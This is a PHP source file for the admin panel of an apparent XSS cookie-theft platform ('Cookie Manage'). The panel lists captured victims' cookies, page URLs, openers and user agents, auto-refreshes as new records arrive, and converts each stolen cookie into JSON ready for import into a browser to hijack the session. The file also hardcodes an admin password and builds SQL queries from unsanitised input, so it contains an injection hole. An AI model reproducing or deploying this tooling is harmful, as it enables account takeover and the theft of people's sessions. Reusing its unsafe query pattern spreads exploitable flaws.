<?php
/**
 * 后台管理主页
 */
require '../config.php';
require 'page.php';
$mysqli= mysql_con();

session_start();
if($_GET['layout']=='yes'){
    session_unset();
    session_destroy();
    header("Location:login.php");
    exit;
}
if($_SESSION['user']!='admin' || $_SESSION['password'] !='tu!@#') {
    header("Location:login.php");
    exit;
}

$search_key=null;
//search
if(!empty($_GET['site'])){
    $site=$_GET['site'];
    $result=$mysqli->query("select * from tu_message where href LIKE '%{$site}%' ");
    $page=new Page($result->num_rows,10);

    $sql='select * from tu_message where href LIKE '."'%{$site}%'".$page->limit;
    $list=$mysqli->query($sql);
    $search_key=$site;
}else{
    $result=$mysqli->query("select * from tu_message");
    $page=new Page($result->num_rows,10);

    $sql='select * from tu_message order by id desc '.$page->limit;
    $list=$mysqli->query($sql);
}



?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>tutu</title>
    <link rel="stylesheet" href="/asset/common.css">
</head>
<body>
<header>
    <h1><img src="" alt="">Cookie Manage</h1>
    <form action="web.php">
        <input type="text" placeholder="input a site name" name="site">
        <input type="submit" value="搜索">
        <a href="javascript:;" class="refresh">刷新 <em id="refresh">180</em>s</a>
        <a href="web.php?layout=yes">退出</a>
    </form>
</header>

<section class="page">
    <div>
        <ul>
            <?php echo $page->showpage(); ?>
            <?php if($search_key){ ?>
            <li><a href="javascript:;">search key : <strong><?php echo $search_key; ?></strong></a></li>
            <li><a href="web.php" class="return">return home page</a></li>
            <?php } ?>
        </ul>
    </div>
</section>


<section class="main-data">
    <ul>
        <?php foreach ($list as $k=>$it){ ?>
        <li>
            <span class="number" data-id="<?php echo $it['id'];?>">
                <?php echo format($it['create_time']); ?>
                <?php if(!$it['read_state']){ ?>
                <br /><br />
                <a href="javascript:;"></a>
                <?php } ?>
            </span>
            <div>
                <a href="javascript:;" data-cookie="<?php echo $it['cookie'];?>" data-hostname="<?php echo $it['hostname'];?>" class="cookie">[cookie]</a>
                <p><?php echo $it['cookie']; ?></p>
            </div>
            <div>
                <a href="javascript:;">[href]</a>
                <p><?php echo $it['href']; ?></p>
            </div>

            <div>
                <a href="javascript:;">[tophref]</a>
                <p><?php echo $it['tophref']; ?></p>
            </div>
            <div>
                <a href="javascript:;">[opener]</a>
                <p><?php echo $it['opener']; ?></p>
            </div>
            <div>
                <a href="javascript:;">[Agent]</a>
                <p><?php echo $it['userAgent']; ?></p>
            </div>
            <a href="javascript:;" data-id="<?php echo $it['id']; ?>" class="delete">delete</a>
        </li>
        <?php } ?>
    </ul>
</section>

<div class="loading">
    <div class="maskbg"></div>
    <div class="ball-clip-rotate">
        <div></div>
    </div>
</div>

<!--<script src="//xs.com"></script>-->
<script>

    var time=document.querySelector('#refresh');
    setInterval(function(){
        var num=Number(time.innerHTML);
        if(num==0){
            location.reload();
            return ;
        }
        time.innerHTML=num-1;
    },1000);

    var read=document.querySelectorAll('.number');
    read.forEach(function(e){
        e.addEventListener('click',function(event){
            var target=event.target,
                id=target.dataset.id;

            var xhr=new XMLHttpRequest;
            xhr.open('POST','api.php');
            xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            xhr.onreadystatechange=function(){
                if(xhr.readyState == 4){
                    var res=JSON.parse(xhr.responseText)
                    if(res.success){
                        target.removeChild(target.querySelector('a'))
                    }
                }
            }

            xhr.send('id='+id+'&change=read');

        },false)
    })

    //listen delete
    var del=document.querySelectorAll('.delete');
    del.forEach(function(e){
        e.addEventListener('click',function (event) {
            var target=event.target,
                id=target.dataset.id;
            var xhr=new XMLHttpRequest;
            xhr.open('POST','api.php');
            xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            xhr.onreadystatechange=function(){
                if(xhr.readyState == 4){
                    var res=JSON.parse(xhr.responseText);
                    var loading=document.querySelector('.loading');
                    loading.classList.add('block');
                    setTimeout(function () {
                        if(res.success){
                            loading.classList.remove('block');
                            target.parentNode.parentNode.removeChild(target.parentNode)
                        }
                    },300)

                }
            }

            xhr.send('id='+id+'&delete=yes');

        },false)
    })

    //cookie to json string
    var coke=document.querySelectorAll('a.cookie');
    coke.forEach(function(e){
        e.addEventListener('click',function (event) {
            var cookie=event.target.dataset.cookie,
                hostname=event.target.dataset.hostname,
                cookieJson=[];

            cookie=cookie.split(';');
            console.log(cookie)
            cookie.forEach(function(e,i) {
                var ar = e.split('=');
                if(ar.length>2){
                    var arn=[];
                    arn[0]=ar[0];
                    arn[1]=[];
                    ar.forEach(function(e,ind){
                        if(!isNaN(ind) && ind>0){
                            arn[1].push(e);
                        }
                    })
                    arn[1]=arn[1].join('=')
                    ar=arn;
                }
                i++;
                if (!isNaN(i)) {
                    cookieJson.push({
                        "domain":hostname,
                        "name":ar[0].trim(),
                        "path":"/",
                        "session": false,
                        "storeId":"0",
                        "value":ar[1].trim(),
                        "id":i
                    })
                }
            })
            window.prompt('please copy',JSON.stringify(cookieJson))

        },false)
    })

</script>
</body>
</html>

<?php
$list->free();
$mysqli->close();
?>